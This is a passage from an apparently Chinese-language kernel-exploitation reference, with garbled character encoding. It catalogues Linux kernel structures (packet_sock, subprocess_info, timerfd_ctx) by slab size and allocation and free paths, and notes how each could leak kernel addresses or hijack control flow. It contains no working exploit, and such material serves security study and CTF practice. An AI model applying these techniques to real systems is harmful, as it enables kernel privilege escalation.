<span class="title">tpacket_versions</span><span class="title">tp_version</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_hdrlen;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_reserve;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>tp_tstamp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span><span class="title">skb_completion</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> __<span class="title">rcu</span>*<span class="title">cached_dev</span>;</span></span><br><span class="line"><span class="type">int</span>(*xmit)(<span class="keyword">struct</span> sk_buff *skb);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packet_type</span><span class="title">prot_hook</span> ____<span class="title">cacheline_aligned_in_smp</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>tp_drops ____cacheline_aligned_in_smp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…"><a href="#åˆ†é…" class="headerlink" title="åˆ†é…"></a>åˆ†é…</h3><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª packet socket æ—¶å†…æ ¸ä¾¿ä¼šåˆ†é…ä¸€ä¸ª <code>packet_sock</code> ç»“æ„ä½“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼åˆ›å»º packet socketï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸ä¸­å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sys_socket()</span><br><span class="line">    __sys_socket()</span><br><span class="line">    sock_create()</span><br><span class="line">    __sock_create()</span><br><span class="line">    <span class="comment">// é¦–å…ˆåœ¨ net_families æ•°ç»„ä¸­æ‰¾åè®®æ—å¯¹åº”çš„ net_proto_family ç»“æ„ä½“</span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">     * å¯¹ AF_PACKET è€Œè¨€ï¼Œå…¶åœ¨ packet_init() ä¸­é€šè¿‡ sock_register()</span></span><br><span class="line"><span class="comment">     * æ³¨å†Œäº†packet_family_opsï¼Œå…¶ä¸­ create æŒ‡é’ˆä¸º packet_create()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">// æ¥ä¸‹æ¥ä¼šè°ƒç”¨ net_proto_family çš„ create æŒ‡é’ˆè¿›è¡Œ sock çš„åˆ›å»º</span></span><br><span class="line">    packet_create()</span><br><span class="line">    sk_alloc()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>packet_create()</code> ä¸­ä¼šè°ƒç”¨ <code>sk_alloc()</code> åˆ›å»º sock çš„ç©ºé—´ï¼Œè¿™æ˜¯ä¸€ä¸ªé€šç”¨çš„åˆ›å»º sock çš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°ä¼ å…¥ä¸€ä¸ªæŒ‡å‘ proto ç»“æ„ä½“ç±»å‹å…¨å±€å˜é‡ <code>packet_proto</code> çš„æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params"> <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    sk = sk_alloc(net, PF_PACKET, GFP_KERNEL, &amp;packet_proto, kern);</span><br></pre></td></tr></table></figure><p><code>sk_alloc()</code> æœ€åä¼šè°ƒç”¨åˆ° <code>sk_prot_alloc()</code>ï¼Œå¯¹äºåœ¨åè®®å¯¹åº”çš„ proto ç»“æ„ä½“ä¸­æœ‰æŒ‡å®š kmem_cache çš„æƒ…å†µè€Œè¨€ä¼šç›´æ¥ä»å…¶ä¸­åˆ†é…å¯¹è±¡ï¼Œå¦åˆ™èµ°å¸¸è§„çš„ kmalloc åˆ†é…è·¯å¾„ï¼Œè¿™é‡Œæˆ‘ä»¬æ³¨æ„åˆ°åˆ†é…çš„ flag ä¸º <code>GFP_KERNEL</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> sock *<span class="title function_">sk_prot_alloc</span><span class="params">(<span class="keyword">struct</span> proto *prot, <span class="type">gfp_t</span> priority,</span></span><br><span class="line"><span class="params"><span class="type">int</span> family)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span></span><br><span class="line"></span><br><span class="line">slab = prot-&gt;slab;</span><br><span class="line"><span class="keyword">if</span> (slab != <span class="literal">NULL</span>) &#123;</span><br><span class="line">sk = kmem_cache_alloc(slab, priority &amp; ~__GFP_ZERO);</span><br><span class="line"><span class="keyword">if</span> (!sk)</span><br><span class="line"><span class="keyword">return</span> sk;</span><br><span class="line"><span class="keyword">if</span> (want_init_on_alloc(priority))</span><br><span class="line">sk_prot_clear_nulls(sk, prot-&gt;obj_size);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">sk = kmalloc(prot-&gt;obj_size, priority);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sk != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (security_sk_alloc(sk, family, priority))</span><br><span class="line"><span class="keyword">goto</span> out_free;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(prot-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_free_sec;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sk;</span><br><span class="line"></span><br><span class="line">out_free_sec:</span><br><span class="line">security_sk_free(sk);</span><br><span class="line">out_free:</span><br><span class="line"><span class="keyword">if</span> (slab != <span class="literal">NULL</span>)</span><br><span class="line">kmem_cache_free(slab, sk);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">kfree(sk);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†é…çš„å¯¹è±¡ size ä¸º <code>proto-&gt;obj_size</code>ï¼Œåœ¨ <code>packet_proto</code> ä¸­æŒ‡å®šä¸º <code>packet_sock</code> çš„å¤§å°ï¼Œåœ¨å„ä¸ªç‰ˆæœ¬ä¸Šå¯èƒ½ç•¥æœ‰ä¸åŒï¼ˆç¬”è€…çš„æœºå­ä¸Šæ˜¯1500+ï¼Œä¹Ÿè§åˆ°æœ‰1400+çš„ï¼‰ï¼Œä¸è¿‡å¤§å°æµ®åŠ¨ä¸å¤§ï¼Œæœ€ç»ˆéƒ½ä¼šä» <code>kmalloc-2k</code> ä¸­å–å¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proto</span> <span class="title">packet_proto</span> =</span> &#123;</span><br><span class="line">.name  = <span class="string">&quot;PACKET&quot;</span>,</span><br><span class="line">.owner  = THIS_MODULE,</span><br><span class="line">.obj_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> packet_sock),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="é‡Šæ”¾-1"><a href="#é‡Šæ”¾-1" class="headerlink" title="é‡Šæ”¾"></a>é‡Šæ”¾</h3><p>å½“æˆ‘ä»¬å…³é—­å¯¹åº”çš„å¥—æ¥å­—æ—¶å°±èƒ½é‡Šæ”¾å¯¹åº”çš„ sock ç»“æ„ä½“äº†</p><p>ä¼—æ‰€å‘¨çŸ¥ Linux ä¸­â€œä¸€åˆ‡çš†æ–‡ä»¶â€ï¼Œåœ¨æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—æ—¶å…¶å®å†…æ ¸ä¸­ä¼šåˆ›å»ºä¸€ä¸ª file ç»“æ„ä½“å¹¶è¿”å›ç»™æˆ‘ä»¬ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œåœ¨ <code>__sys_socket()</code> ä¸­ä¼šé€šè¿‡ <code>sock_map_fd()</code> åˆ†é…ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å¹¶å°†å¥—æ¥å­—æ–‡ä»¶çš„å‡½æ•°è¡¨è®¾ä¸º <code>socket_file_ops</code>ï¼Œå…¶ä¸­ close æŒ‡é’ˆå¯¹åº”çš„å‡½æ•°åº”ä¸º <code>sock_close()</code>ï¼Œå…¶å®ä¸º <code>__sock_release() </code>çš„ wrapper</p><p>è¯¥å‡½æ•°ä¼šæ£€æŸ¥ socket çš„å‡½æ•°è¡¨ï¼Œè‹¥æœ‰åˆ™ç›´æ¥è°ƒç”¨å…¶å‡½æ•°è¡¨çš„ release å‡½æ•°æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> __sock_release(<span class="keyword">struct</span> socket *sock, <span class="keyword">struct</span> inode *inode)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (sock-&gt;ops) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span> =</span> sock-&gt;ops-&gt;owner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inode)</span><br><span class="line">inode_lock(inode);</span><br><span class="line">sock-&gt;ops-&gt;release(sock);</span><br><span class="line">sock-&gt;sk = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (inode)</span><br><span class="line">inode_unlock(inode);</span><br><span class="line">sock-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">module_put(owner);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sock-&gt;wq.fasync_list)</span><br><span class="line">pr_err(<span class="string">&quot;%s: fasync list not empty!\n&quot;</span>, __func__);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sock-&gt;file) &#123;</span><br><span class="line">iput(SOCK_INODE(sock));</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">sock-&gt;file = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¡¨çš„è®¾ç½®å…¶å®åœ¨ <code>sk_alloc()</code> ä¸­é€šè¿‡åè®®æ—å¯¹åº”çš„ç»“æ„ä½“çš„ create å‡½æ•°æŒ‡é’ˆæ‰§è¡Œè¿‡ç¨‹ä¸­è¿›è¡ŒæŒ‡å®šï¼Œå¯¹åº” packet socket è€Œè¨€å³åœ¨ <code>packet_create()</code> ä¸­æŒ‡å®šï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å‡½æ•°è¡¨è¢«è®¾ä¸º <code>packet_ops</code> æˆ– <code>packet_ops_spkt</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">packet_create</span><span class="params">(<span class="keyword">struct</span> net *net, <span class="keyword">struct</span> socket *sock, <span class="type">int</span> protocol,</span></span><br><span class="line"><span class="params"> <span class="type">int</span> kern)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">sock-&gt;ops = &amp;packet_ops;</span><br><span class="line"><span class="keyword">if</span> (sock-&gt;type == SOCK_PACKET)</span><br><span class="line">sock-&gt;ops = &amp;packet_ops_spkt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤ä¸ªå‡½æ•°è¡¨çš„ release æŒ‡é’ˆå¯¹åº”çš„éƒ½æ˜¯ <code>packet_release()</code>ï¼Œæœ€ç»ˆå­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">packet_release()</span><br><span class="line">    sock_put()</span><br><span class="line">    sk_free() <span class="comment">// å¼•ç”¨è®¡æ•°ä¸º 0 æ—¶è°ƒç”¨ï¼Œé‡Šæ”¾ sock ç»“æ„ä½“</span></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ä¸è¦æ··æ·†äº† sock å’Œ socket å“Ÿï¼Œä¸çŸ¥é“çš„å¯ä»¥å»ç™¾åº¦ï¼ˆç¬‘ï¼‰</p></blockquote><h3 id="æ•°æ®æ³„éœ²-6"><a href="#æ•°æ®æ³„éœ²-6" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h3 id="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-3"><a href="#åŠ«æŒå†…æ ¸æ‰§è¡Œæµ-3" class="headerlink" title="åŠ«æŒå†…æ ¸æ‰§è¡Œæµ"></a>åŠ«æŒå†…æ ¸æ‰§è¡Œæµ</h3><h1 id="0x0B-subprocess-info-ä¸å¥—æ¥å­—ç›¸å…³"><a href="#0x0B-subprocess-info-ä¸å¥—æ¥å­—ç›¸å…³" class="headerlink" title="0x0B.subprocess_info ä¸å¥—æ¥å­—ç›¸å…³"></a>0x0B.subprocess_info ä¸å¥—æ¥å­—ç›¸å…³</h1><p>Linux å†…æ ¸çš„ç½‘ç»œåè®®æ ˆçš„ä¸€ç³»åˆ—æ“ä½œåŒæ ·æ¶‰åŠåˆ°ä¸€ç³»åˆ—çš„ç»“æ„ä½“ï¼Œå…¶ä¸­ <code>subprocess_info</code> ä¾¿æ˜¯ä¸€ä¸ªæ¯”è¾ƒç¥å¥‡çš„ç»“æ„ä½“ï¼Œè¿™é‡Œä¹Ÿæ¥ç®€å•ä»‹ç»ä¸€ä¸‹</p><h2 id="subprocess-infoï¼škmalloc-128"><a href="#subprocess-infoï¼škmalloc-128" class="headerlink" title="subprocess_infoï¼škmalloc-128"></a>subprocess_infoï¼škmalloc-128</h2><blockquote><p>æ„Ÿè§‰æ²¡å•¥å¥½è¯´çš„â€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *path;</span><br><span class="line"><span class="type">char</span> **argv;</span><br><span class="line"><span class="type">char</span> **envp;</span><br><span class="line"><span class="type">int</span> wait;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"><span class="type">int</span> (*init)(<span class="keyword">struct</span> subprocess_info *info, <span class="keyword">struct</span> cred *new);</span><br><span class="line"><span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> subprocess_info *info);</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h3 id="äº§ç”Ÿ-amp-é‡Šæ”¾"><a href="#äº§ç”Ÿ-amp-é‡Šæ”¾" class="headerlink" title="äº§ç”Ÿ &amp; é‡Šæ”¾"></a>äº§ç”Ÿ &amp; é‡Šæ”¾</h3><p>å½“æˆ‘ä»¬å°è¯•åˆ›å»ºä¸€ä¸ªæœªçŸ¥åè®®ï¼ˆ<code>socket(22, AF_INET, 0)</code>ï¼‰æ—¶ï¼Œä¾¿ä¼šåˆ›å»ºä¸€ä¸ª <code>subprocess_info</code> ç»“æ„ä½“ï¼Œå¯¹åº”åœ°ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨ç»“æŸä¹‹åè¯¥ç»“æ„ä½“ä¾¿ä¼šè¢«ç«‹å³é‡Šæ”¾ï¼Œè¿‡ç¨‹å…¶å®æœ‰ç‚¹ç±»ä¼¼ setxattrï¼Œä¸åŒçš„æ˜¯æ²¡æœ‰ä»»ä½•ç”¨æˆ·ç©ºé—´æ•°æ®ä¼šè¢«æ‹·è´è‡³å†…æ ¸ç©ºé—´</p><p>å› ä¸ºè¯¥ç»“æ„ä½“åœ¨åˆ›å»ºä¹‹åå°±ä¼šè¢«é‡Šæ”¾æ‰ï¼Œå› æ­¤åŸºäºè¯¥ç»“æ„ä½“çš„åˆ©ç”¨éƒ½è¦ç”¨åˆ°æ¡ä»¶ç«äº‰ï¼Œç¬”è€…è®¤ä¸ºå…¶å®ä¸æ˜¯ç‰¹åˆ«çš„æ–¹ä¾¿</p><blockquote><p>ç¬”è€…æœ¬æƒ³åˆ†æä¸€ä¸‹å…¶åˆ›å»ºä¸é‡Šæ”¾çš„è°ƒç”¨é“¾ï¼Œä½†æ˜¯å¤§é‡ä½¿ç”¨äº† LSM hook çœ‹ç€å®åœ¨å¤´ç–¼ï¼Œå°±æ­¤ä½œç½¢ï¼Œå°±åˆ©ç”¨å±‚é¢è€Œè¨€è¿™ä¸ªç»“æ„ä½“ä¹Ÿä¸æ˜¯ç‰¹åˆ«å¥½ç”¨+ç¨³å®šï¼Œæ‰€ä»¥è¿™é‡ŒåªæŠ„ä¸€äº›æ€»ç»“æ€§çš„ç»“è®ºXD</p></blockquote><h3 id="æ•°æ®æ³„éœ²ï¼ˆæ¡ä»¶ç«äº‰ï¼‰"><a href="#æ•°æ®æ³„éœ²ï¼ˆæ¡ä»¶ç«äº‰ï¼‰" class="headerlink" title="æ•°æ®æ³„éœ²ï¼ˆæ¡ä»¶ç«äº‰ï¼‰"></a>æ•°æ®æ³„éœ²ï¼ˆæ¡ä»¶ç«äº‰ï¼‰</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€-4"><a href="#å†…æ ¸-text-æ®µåœ°å€-4" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p>è¯¥ç»“æ„ä½“çš„ <code>work.func</code> å¯èƒ½æŒ‡å‘ <code>call_usermodehelper_exec_work</code>ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½åˆ©ç”¨æ¡ä»¶ç«äº‰è¯»å‡ºè¯¥æŒ‡é’ˆä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸çš„ .text æ®µçš„åŸºå€</p><h3 id="åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ˆæ¡ä»¶ç«äº‰ï¼‰"><a href="#åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ˆæ¡ä»¶ç«äº‰ï¼‰" class="headerlink" title="åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ˆæ¡ä»¶ç«äº‰ï¼‰"></a>åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼ˆæ¡ä»¶ç«äº‰ï¼‰</h3><p>åœ¨é‡Šæ”¾è¯¥ç»“æ„ä½“æ—¶ä¼šè°ƒç”¨å…¶ <code>cleanup</code> æŒ‡é’ˆæˆå‘˜ï¼Œè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨åˆ›å»ºè¯¥ç»“æ„ä½“ä¹‹åã€é‡Šæ”¾è¯¥ç»“æ„ä½“ä¹‹å‰åŠ«æŒè¯¥æŒ‡é’ˆä¾¿èƒ½æ§åˆ¶å†…æ ¸æ‰§è¡Œæµ</p><blockquote><p>ä¾‹é¢˜ï¼šSCTF2022 - flying_kernel</p><blockquote><p>ç¬”è€…åœ¨æ¯”èµ›ä¸­æ­»æ´»ç«äº‰ä¸å‡ºæ¥ï¼Œå°±å¾ˆç¦»è°±â€¦æ‰€ä»¥æš‚æ—¶æ²¡æœ‰ wpï¼ˆğŸ•Š</p></blockquote></blockquote><h1 id="0x0C-timerfd-ctx-ä¸-timerfd-ç³»åˆ—ç³»ç»Ÿè°ƒç”¨"><a href="#0x0C-timerfd-ctx-ä¸-timerfd-ç³»åˆ—ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="0x0C.timerfd_ctx ä¸ timerfd ç³»åˆ—ç³»ç»Ÿè°ƒç”¨"></a>0x0C.timerfd_ctx ä¸ timerfd ç³»åˆ—ç³»ç»Ÿè°ƒç”¨</h1><p>è‡ª 2.6.25 ç‰ˆæœ¬èµ· Linux æä¾›äº†ä¸€ç§å¯ä»¥ç”¨ä»¥åˆ›å»ºå®šæ—¶å™¨çš„ç³»ç»Ÿè°ƒç”¨â€”â€”timerfd ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ï¼Œç›¸æ¯”èµ·å®šæ—¶å™¨çš„åŠŸèƒ½ï¼Œæˆ‘ä»¬æ›´åŠ å…³æ³¨ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°çš„ <code>timerfd_ctx</code> ç»“æ„ä½“</p><h2 id="timerfd-ctxï¼ˆkmalloc-256-GPF-KERNELï¼‰"><a href="#timerfd-ctxï¼ˆkmalloc-256-GPF-KERNELï¼‰" class="headerlink" title="timerfd_ctxï¼ˆkmalloc-256 | GPF_KERNELï¼‰"></a>timerfd_ctxï¼ˆkmalloc-256 | GPF_KERNELï¼‰</h2><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>fs/timerfd.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> <span class="title">tmr</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alarm</span> <span class="title">alarm</span>;</span></span><br><span class="line">    &#125; t;</span><br><span class="line">    <span class="type">ktime_t</span> tintv;</span><br><span class="line">    <span class="type">ktime_t</span> moffs;</span><br><span class="line">    <span class="type">wait_queue_head_t</span> wqh;</span><br><span class="line">    u64 ticks;</span><br><span class="line">    <span class="type">int</span> clockid;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> expired;</span><br><span class="line">    <span class="type">short</span> <span class="type">unsigned</span> settime_flags;    <span class="comment">/* to show in fdinfo */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">clist</span>;</span></span><br><span class="line">    <span class="type">spinlock_t</span> cancel_lock;</span><br><span class="line">    <span class="type">bool</span> might_cancel;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„ <code>hrtimer</code> ç»“æ„ä½“å®šä¹‰äº <code>/include/linux/hrtimer.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerqueue_node</span>        <span class="title">node</span>;</span></span><br><span class="line">    <span class="type">ktime_t</span>                _softexpires;</span><br><span class="line">    <span class="keyword">enum</span> <span class="title function_">hrtimer_restart</span>        <span class="params">(*function)</span><span class="params">(<span class="keyword">struct</span> hrtimer *)</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hrtimer_clock_base</span>    *<span class="title">base</span>;</span></span><br><span class="line">    u8                state;</span><br><span class="line">    u8                is_rel;</span><br><span class="line">    u8                is_soft;</span><br><span class="line">    u8                is_hard;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="åˆ†é…-x2F-é‡Šæ”¾-2"><a href="#åˆ†é…-x2F-é‡Šæ”¾-2" class="headerlink" title="åˆ†é…&#x2F;é‡Šæ”¾"></a>åˆ†é…&#x2F;é‡Šæ”¾</h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>timerfd_create</code> ç³»ç»Ÿè°ƒç”¨æ¥åˆ†é…ä¸€ä¸ª <code>timerfd_ctx</code> ç»“æ„ä½“ï¼Œåœ¨ <code>fs/timerfd.c</code> ä¸­æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(timerfd_create, <span class="type">int</span>, clockid, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ufd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    ctx = kzalloc(<span class="keyword">sizeof</span>(*ctx), GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·åœ°ï¼Œå¯¹äº timerfd æ–‡ä»¶åœ¨ <code>fs/timerfd.c</code> ä¸­å®šä¹‰äº†å…¶å‡½æ•°è¡¨ <code>timerfd_ops</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">timerfd_fops</span> =</span> &#123;</span><br><span class="line">    .release    = timerfd_release,</span><br><span class="line">    .poll        = timerfd_poll,</span><br><span class="line">    .read        = timerfd_read,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .show_fdinfo    = timerfd_show,</span><br><span class="line">    .unlocked_ioctl    = timerfd_ioctl,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ 